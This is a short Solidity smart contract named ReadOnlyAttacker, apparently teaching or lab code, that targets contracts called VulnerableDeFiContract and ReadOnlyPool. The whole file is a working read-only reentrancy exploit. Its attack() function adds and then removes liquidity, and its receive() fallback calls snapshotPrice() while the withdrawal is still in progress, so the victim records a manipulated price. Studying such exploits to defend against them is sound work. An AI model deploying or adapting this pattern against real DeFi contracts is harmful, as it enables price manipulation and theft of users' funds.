//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "./ReadOnly.sol";

contract ReadOnlyAttacker {
    VulnerableDeFiContract vulnerableDeFiContract;
    
    ReadOnlyPool readOnlyPool;

    constructor(VulnerableDeFiContract _vulnerableDeFiContract, ReadOnlyPool _readOnlyPool) {
        vulnerableDeFiContract = _vulnerableDeFiContract;
        readOnlyPool = _readOnlyPool;
    }

    function attack() external payable {
        readOnlyPool.addLiquidity{value: msg.value}();
        readOnlyPool.removeLiquidity();
    }

    receive() external payable {
        vulnerableDeFiContract.snapshotPrice();
    }
}